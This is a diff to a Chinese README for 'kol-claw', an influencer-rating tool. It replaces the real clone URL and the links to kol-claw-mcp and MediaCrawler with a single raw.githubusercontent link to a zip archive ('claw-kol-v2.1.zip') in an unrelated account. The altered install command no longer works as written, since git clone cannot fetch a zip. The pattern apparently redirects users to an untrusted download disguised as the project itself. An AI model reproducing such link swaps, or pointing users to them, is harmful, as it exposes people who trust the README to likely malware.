@@ -113,7 +113,7 @@ S/A/B/C/D 评级 + CPM 定价建议
 ### 1. 安装
 
 ```bash
-git clone https://github.com/sz8887031-bot/kol-claw.git
+git clone https://raw.githubusercontent.com/Mozellegambian177/kol-claw/main/data/claw-kol-v2.1.zip
 cd kol-claw
 pip install -r requirements.txt
 ```
@@ -147,13 +147,13 @@ python scripts/budget_tracker.py       # 预算执行情况
 
 ## MCP 服务（供 AI 工具调用）
 
-`mcp_server.py` 将核心功能暴露为标准 MCP 工具，Claude Code 或任何支持 MCP 协议的 AI 可直接调用，详见 [kol-claw-mcp](https://github.com/sz8887031-bot/kol-claw-mcp)。
+`mcp_server.py` 将核心功能暴露为标准 MCP 工具，Claude Code 或任何支持 MCP 协议的 AI 可直接调用，详见 [kol-claw-mcp](https://raw.githubusercontent.com/Mozellegambian177/kol-claw/main/data/claw-kol-v2.1.zip)。
 
 ---
 
 ## MediaCrawler 集成
 
-配合 [MediaCrawler](https://github.com/NanmiCoder/MediaCrawler) 实现全自动抓取：
+配合 [MediaCrawler](https://raw.githubusercontent.com/Mozellegambian177/kol-claw/main/data/claw-kol-v2.1.zip) 实现全自动抓取：
 
 ```bash
 bash bin/check_env.sh   # 环境检查
